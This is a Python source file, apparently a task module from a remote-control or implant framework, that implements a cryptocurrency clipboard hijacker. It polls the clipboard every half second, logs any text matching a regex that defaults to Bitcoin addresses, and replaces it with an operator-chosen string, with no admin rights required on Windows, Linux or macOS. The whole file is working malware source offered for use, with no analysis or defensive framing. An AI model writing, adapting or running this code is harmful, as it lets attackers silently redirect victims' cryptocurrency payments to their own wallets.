from tasks.__task import Task


class ClipboardReplacer(Task):
    """Replaces clipboard contents which matches regex."""
    platforms = ["win32", "linux", "darwin"]
    description = __doc__
    administrator = {"win32": False, "linux": False, "darwin": False}
    kwargs = {"regex": {"type": str, "description": "Regular expression. Default is for Bitcoin addresses.",
                        "default": "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"},
              "replace_to": {"type": str, "description": "String which will be copied to cliboard if regex matches.",
                             "default": ""}
              }

    def __init__(self, task_id):
        super(ClipboardReplacer, self).__init__(task_id)
        import threading
        self._data = []
        self._run = threading.Event()

    def run(self, **kwargs):
        assert "regex" in kwargs, "Missing keyword argument regex!"
        assert "replace_to" in kwargs, "Missing keyword argument replace_to!"

        regex = kwargs.get("regex")
        replace_to = kwargs.get("replace_to")

        import re
        import time
        import pyperclip

        self._run.set()
        while self._run.is_set():
            data = str(pyperclip.paste())
            if re.fullmatch(regex, data):
                self._data.append(data)
                pyperclip.copy(replace_to)
            time.sleep(0.500)
        return self._data

    def stop(self):
        self._run.clear()
